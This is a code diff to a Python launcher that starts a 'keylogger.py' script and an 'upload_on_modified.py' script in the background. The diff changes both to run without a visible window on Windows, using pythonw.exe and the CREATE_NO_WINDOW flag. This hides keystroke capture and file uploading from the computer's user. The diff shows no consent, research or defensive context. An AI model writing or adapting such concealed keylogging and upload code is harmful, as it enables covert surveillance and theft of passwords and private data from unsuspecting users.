@@ -13,7 +13,7 @@ current_os = platform.system()
 
 # Determine the python executable path in the virtual environment
 if current_os == "Windows":
-    python_exe = os.path.join(root_dir, ".venv", "Scripts", "python.exe")
+    python_exe = os.path.join(root_dir, ".venv", "Scripts", "pythonw.exe")
 else:
     python_exe = os.path.join(root_dir, ".venv", "bin", "python")
 
@@ -29,10 +29,10 @@ if current_os == "Linux":
 print(f"Starting scripts with {python_exe}...")
 
 # Run keylogger script in the background
-keylogger_proc = subprocess.Popen([python_exe, "keylogger.py"], cwd=script_dir)
+keylogger_proc = subprocess.Popen([python_exe, "keylogger.py"], cwd=script_dir, creationflags=subprocess.CREATE_NO_WINDOW)
 
 # Run upload script in the background
-upload_proc = subprocess.Popen([python_exe, "upload_on_modified.py"], cwd=script_dir)
+upload_proc = subprocess.Popen([python_exe, "upload_on_modified.py"], cwd=script_dir, creationflags=subprocess.CREATE_NO_WINDOW)
 
 print("Scripts are running. Press Ctrl+C to stop both.")
 
